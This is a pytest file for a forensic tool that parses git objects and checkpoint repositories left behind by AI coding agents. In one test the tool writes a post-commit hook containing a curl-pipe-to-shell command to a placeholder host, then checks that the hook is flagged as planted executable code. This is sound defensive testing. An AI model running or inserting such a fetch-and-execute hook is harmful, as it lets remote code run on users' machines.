"""Tests for the git object reader and for the checkpoint parser reading a repository.

There is no library here to test against, so the objects are written by git itself and then
read back. That is the strongest form this test can take: a reader that agrees with the
files git produces is a reader that agrees with git, and a fixture built to the format from
the documentation would only prove the documentation was read the same way twice.

git is not always installed, so those tests skip without it. The pure-format cases below
them do not, because they are about what this reader does with a file that is not an object,
and that is the branch a collection actually exercises.
"""

from __future__ import annotations

import os
import shutil
import subprocess
import tempfile
import zlib
from pathlib import Path

import pytest

from agentforensics.parsers import ParseContext, for_artifact
from agentforensics.parsers.git_objects import GitObjectError, looks_like_loose_object, read

pytestmark = pytest.mark.skipif(shutil.which("git") is None, reason="git is not installed")

SESSION = "4f8c1e2a-0000-4000-8000-000000000001"
ARTIFACT = "amazonq.cli_checkpoints"

# A fixed instant and identity, so two runs produce the same objects. The address is the
# documentation's placeholder.
_ENV = {
    "GIT_AUTHOR_NAME": "alice",
    "GIT_AUTHOR_EMAIL": "alice@example.org",
    "GIT_COMMITTER_NAME": "alice",
    "GIT_COMMITTER_EMAIL": "alice@example.org",
    "GIT_AUTHOR_DATE": "1788912000 +0000",
    "GIT_COMMITTER_DATE": "1788912000 +0000",
}


@pytest.fixture(scope="module")
def repository(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """A repository of the shape an agent leaves behind: one commit, one file."""
    root = tmp_path_factory.mktemp("shadow")
    _git(root, "init", "-q", "-b", "main")
    (root / "settings.json").write_text(
        '{"authorization": "Bearer sk_live_examplekey0123456789"}\n',
        encoding="utf-8",
        newline="",
    )
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", "checkpoint before the agent edited settings.json")
    return root


def _git(root: Path, *args: str) -> str:
    return subprocess.run(
        ["git", "-C", str(root), *args],
        env={**os.environ, **_ENV},
        capture_output=True,
        text=True,
        check=True,
    ).stdout.strip()


def _object(root: Path, revision: str) -> bytes:
    object_id = _git(root, "rev-parse", revision)
    return (root / ".git" / "objects" / object_id[:2] / object_id[2:]).read_bytes()


def test_a_commit_gives_up_its_tree_its_identity_and_its_own_clock(repository: Path) -> None:
    """The commit's time is the find. A reference log dates when a checkpoint was written
    and this dates when the content was captured, by the clock of the machine that did it."""
    found = read(_object(repository, "HEAD"))
    assert found.kind == "commit"
    assert found.tree == _git(repository, "rev-parse", "HEAD^{tree}")
    assert found.author == "alice <alice@example.org>"
    assert found.author_time == "1788912000"
    assert found.author_zone == "+0000"
    assert "checkpoint before the agent edited" in (found.message or "")


def test_a_tree_lists_what_the_agent_had_in_front_of_it(repository: Path) -> None:
    found = read(_object(repository, "HEAD^{tree}"))
    assert found.kind == "tree"
    assert [(entry.name, entry.mode) for entry in found.entries] == [("settings.json", "100644")]
    assert found.entries[0].object_id == _git(repository, "rev-parse", "HEAD:settings.json")
    assert not found.entries[0].is_directory


def test_a_blob_is_the_file_itself(repository: Path) -> None:
    """The whole reason to read an object store. This is the file as it stood before the
    agent changed it, and it is in no transcript."""
    found = read(_object(repository, "HEAD:settings.json"))
    assert found.kind == "blob"
    assert b"sk_live_examplekey0123456789" in found.body


def test_a_directory_in_a_tree_is_marked_as_one(
    tmp_path_factory: pytest.TempPathFactory,
) -> None:
    """A tree entry for a subdirectory names another tree, and a reader that followed it as
    a file would put a directory's hash in a case as file content."""
    root = tmp_path_factory.mktemp("nested")
    _git(root, "init", "-q", "-b", "main")
    (root / "src").mkdir()
    (root / "src" / "app.py").write_text("x = 1\n", encoding="utf-8", newline="")
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", "one")
    entries = read(_object(root, "HEAD^{tree}")).entries
    assert [(entry.name, entry.is_directory) for entry in entries] == [("src", True)]


def test_the_header_is_what_identifies_a_loose_object(repository: Path) -> None:
    assert looks_like_loose_object(_object(repository, "HEAD"))
    assert not looks_like_loose_object(b"ref: refs/heads/main\n")


def test_a_file_under_objects_that_is_not_one_is_refused_rather_than_guessed() -> None:
    """The directory holds more than objects: info/packs, and whatever a tool left there."""
    with pytest.raises(GitObjectError, match="not a zlib stream"):
        read(b"P /home/alice/repo/.git/objects/pack\n")


def test_a_zlib_stream_that_is_not_an_object_says_which_of_the_two_it_is() -> None:
    with pytest.raises(GitObjectError, match="does not begin with an object header"):
        read(zlib.compress(b"this compressed and is not a git object"))


def test_an_object_past_the_limit_is_refused_loudly() -> None:
    """Silently returning the first megabyte of a blob would put half a file in a case as
    the file."""
    with pytest.raises(GitObjectError, match="limit"):
        read(zlib.compress(b"blob 100000\x00" + b"x" * 100000), limit=64)


# ------------------------------------------------- the parser over a repository


def parse(repository: Path, relative: str) -> list:
    parser = for_artifact(ARTIFACT)
    assert parser is not None
    local = repository / ".git" / relative
    return list(
        parser.parse(
            ParseContext(
                bundle_uuid="b1",
                original_path=f"/home/alice/.aws/amazonq/cli-checkouts/{SESSION}/.git/{relative}",
                local_path=local,
                sha256="aa",
                artifact_id=ARTIFACT,
                agent="amazonq",
                user="alice",
            )
        )
    )


def test_a_commit_in_a_repository_the_agent_owns_says_the_content_is_in_the_case(
    repository: Path,
) -> None:
    """The correction this reader needed. Where the agent owns the repository the objects
    travel with it, and the old text told the analyst to go back to the endpoint for
    something they were already holding."""
    object_id = _git(repository, "rev-parse", "HEAD")
    event = parse(repository, f"objects/{object_id[:2]}/{object_id[2:]}")[0]
    assert event.kind == "file.snapshot"
    assert event.raw["type"] == "commit"
    assert event.raw["object_id"] == object_id
    assert event.ts_utc is not None
    assert "are in this case" in (event.parse_problem or "")


def test_a_reference_in_the_users_own_repository_still_says_the_content_is_not(
    repository: Path,
) -> None:
    """The other shape, where only the references were collected. Both sentences have to
    stay available, because which is true depends on the artifact."""
    parser = for_artifact("cline.checkpoint_refs_in_workspace")
    assert parser is not None
    events = list(
        parser.parse(
            ParseContext(
                bundle_uuid="b1",
                original_path=f"/home/alice/src/app/.git/refs/cline/checkpoints/{SESSION}/1",
                local_path=repository / ".git" / "refs" / "heads" / "main",
                sha256="aa",
                artifact_id="cline.checkpoint_refs_in_workspace",
                agent="cline",
                user="alice",
            )
        )
    )
    assert "does not carry" in (events[0].parse_problem or "")


def test_a_hook_that_is_not_one_of_gits_templates_is_an_instruction(
    repository: Path,
) -> None:
    """A hook runs on a repository operation. Every repository is created with a directory
    of disabled templates, and one that is not a template is code somebody put where it
    executes, in a repository an agent made for its own undo."""
    hook = repository / ".git" / "hooks" / "post-commit"
    hook.write_text("#!/bin/sh\ncurl -s https://example.org/x | sh\n", encoding="utf-8", newline="")
    event = parse(repository, "hooks/post-commit")[0]
    assert event.kind == "instruction.source"
    assert event.payload["executable"] is True
    assert "somebody put it somewhere it executes" in (event.parse_problem or "")
    hook.unlink()


def test_gits_own_template_hooks_are_configuration_and_not_unread_records(
    repository: Path,
) -> None:
    """Fifteen of them per repository. Filing git's boilerplate as something nothing could
    read would bury the one number a case's reliability is judged by."""
    event = parse(repository, "hooks/pre-commit.sample")[0]
    assert event.kind == "config.snapshot"
    assert "disabled hook templates" in (event.parse_problem or "")


def test_a_pack_goes_to_the_pack_reader_and_not_to_this_one(repository: Path) -> None:
    """The dispatch, which is this file's half of it: a pack sits under `objects/` like an
    object and is not one, so reading it as a loose object would report a repository's
    whole object store as a file that is not an object. What the pack reader then makes of
    it is tested beside it, against packs git wrote."""
    pack = repository / ".git" / "objects" / "pack" / "pack-0123456789abcdef.pack"
    pack.parent.mkdir(parents=True, exist_ok=True)
    pack.write_bytes(b"PACK\x00\x00\x00\x02" + b"\x00" * 64)
    event = parse(repository, "objects/pack/pack-0123456789abcdef.pack")[0]
    assert "not a loose object" not in (event.parse_problem or "")
    assert "counts no objects" in (event.parse_problem or "")


# ---------------------------------------- the claim, held against the catalogue


def test_which_repositories_carry_their_objects_is_the_catalogues_answer() -> None:
    """The sentence on a reference event is derived, not written down twice.

    Whether the commit behind a checkpoint is in the case is a fact about what the
    catalogue claims, and it was wrong on two of three entries for as long as the reader
    existed: the text said the object store was not collected and for those two it is. A
    set in the module is still the shape this project uses, because a parser is handed an
    artifact id and not a catalogue, so this is what keeps the set honest.

    The candidate below is evidence rather than an answer. It asks the same matcher the
    ingest uses whether a loose object under this artifact's own directory would be claimed
    by this artifact, so narrowing an entry to its references flips this test and the
    module has to follow rather than keep saying the old thing.
    """
    import re as _re

    from agentforensics.catalog import load_catalogue
    from agentforensics.ingest.match import Matcher
    from agentforensics.parsers.git_checkpoints import OWN_REPOSITORY, STORES

    catalogue = load_catalogue(Path(__file__).resolve().parents[2] / "catalog")
    matcher = Matcher(catalogue)

    def concrete(pattern: str) -> str:
        """One catalogue pattern as a path an endpoint could actually have.

        Absolute, because a pattern anchored at a working copy is matched permissively by
        design: the matcher cannot know where the working copy is, so a relative candidate
        matches almost anything and the question this test asks would answer itself.
        """
        text = pattern.replace("\\", "/").rstrip("/")
        text = text.replace("<vscode-user>", "/home/alice/.config/Code/User")
        text = text.replace("<project>", "/home/alice/src/app")
        text = text.replace("<repo_root>", "/home/alice/src/app")
        text = _re.sub(r"<[^>]+>", "abc123", text)
        text = _re.sub(r"/\*+$", "", text)
        return "/home/alice" + text[1:] if text.startswith("~") else text

    def repository_root(pattern: str) -> str | None:
        """The repository this pattern is part of, or nothing when it is not part of one.

        A pattern naming a file inside a repository gives the root away through its .git
        component. A pattern with no such component is only a repository root when it
        claims a directory, which is how a bare one is catalogued. Anything else names a
        file that is not in a repository at all, and appending to it asks about a path
        nothing has: that is twice now that this test answered yes to an entry by building
        a candidate out of a leaf, so the construction is the thing to get right here.
        """
        text = concrete(pattern)
        parts = text.split("/")
        if ".git" in parts:
            return "/".join(parts[: parts.index(".git") + 1])
        stripped = pattern.rstrip()
        if stripped.endswith(("/", "\\")) or stripped.endswith(("*", "**")):
            return text
        return None

    # Where a loose object and a reference sit, relative to a repository's root.
    LOOSE_OBJECT = f"objects/ab/{'c' * 38}"
    REFERENCE = "refs/heads/main"

    def claims(artifact_id: str, tail: str) -> bool:
        for pattern in catalogue.artifact(artifact_id).paths:
            root = repository_root(pattern)
            if root is None:
                continue
            if any(match.artifact.id == artifact_id for match in matcher.matches(f"{root}/{tail}")):
                return True
        return False

    carries = set()
    for artifact_id in STORES:
        # Not every entry this reader claims is a repository. One of them is a scratch
        # directory holding a listing and a path list, with no references and no objects in
        # it at all, and asking whether its object store travelled is a question about a
        # thing it does not have. Decided from the catalogue rather than from a third list
        # in the module, so a new entry answers for itself.
        if not claims(artifact_id, REFERENCE) and not claims(artifact_id, LOOSE_OBJECT):
            continue
        if claims(artifact_id, LOOSE_OBJECT):
            carries.add(artifact_id)

    assert carries == set(OWN_REPOSITORY), {
        "collects its objects and the module does not say so": sorted(carries - OWN_REPOSITORY),
        "the module says so and the catalogue no longer collects them": sorted(
            OWN_REPOSITORY - carries
        ),
    }


# ------------------------------------------------ a tree from a SHA-256 repository

# The hash length is not in the object and the repository configuration git reads it from
# is not necessarily in the collection, so this reader decides it from the bytes. It used
# to decide from one piece of arithmetic on the first entry: the longer hash was chosen
# when what remained after that entry's name divided by thirty-two and not by twenty. Both
# hold whenever the remainder divides by a hundred and sixty, and a two entry tree reaches
# that with an eight character second name, which is why the fixture below has one.


def _sha256_available() -> bool:
    if shutil.which("git") is None:
        return False
    with tempfile.TemporaryDirectory() as where:
        made = subprocess.run(
            ["git", "init", "-q", "--object-format=sha256", "--bare", where],
            capture_output=True,
            text=True,
        )
    return made.returncode == 0


needs_sha256 = pytest.mark.skipif(
    not _sha256_available(), reason="this git cannot make a SHA-256 repository"
)


@pytest.fixture(scope="module")
def long_hash_repository(tmp_path_factory: pytest.TempPathFactory) -> Path:
    """A SHA-256 repository whose tree is the shape the old arithmetic got wrong."""
    root = tmp_path_factory.mktemp("shadow256")
    _git(root, "init", "-q", "-b", "main", "--object-format=sha256")
    (root / "a.txt").write_text("x\n", encoding="utf-8", newline="")
    # Eight characters exactly: with the longer hash this makes what remains after the
    # first entry's name a multiple of twenty as well as of thirty-two.
    (root / "bbbbbbbb").write_text("y\n", encoding="utf-8", newline="")
    _git(root, "add", "-A")
    _git(root, "commit", "-q", "-m", "checkpoint")
    return root


@needs_sha256
def test_a_tree_from_a_long_hash_repository_lists_its_files(
    long_hash_repository: Path,
) -> None:
    tree = read(_object(long_hash_repository, "HEAD^{tree}"))
    assert [entry.name for entry in tree.entries] == ["a.txt", "bbbbbbbb"]
    assert {len(entry.object_id) for entry in tree.entries} == {64}, (
        "a SHA-256 object id is sixty-four characters, and a shorter one means the length "
        "was decided wrongly and every field after it came from the wrong place"
    )
    assert {entry.mode for entry in tree.entries} == {"100644"}


@needs_sha256
def test_the_two_hash_lengths_are_told_apart_rather_than_assumed(
    repository: Path, long_hash_repository: Path
) -> None:
    """Both, side by side, because the failure was never that one was unreadable.

    One length was chosen for both, so whichever repository did not match it was refused
    as damaged while the other went on working, and a test of one alone would have gone on
    passing throughout.
    """
    older = read(_object(repository, "HEAD^{tree}"))
    newer = read(_object(long_hash_repository, "HEAD^{tree}"))
    assert {len(entry.object_id) for entry in older.entries} == {40}
    assert {len(entry.object_id) for entry in newer.entries} == {64}
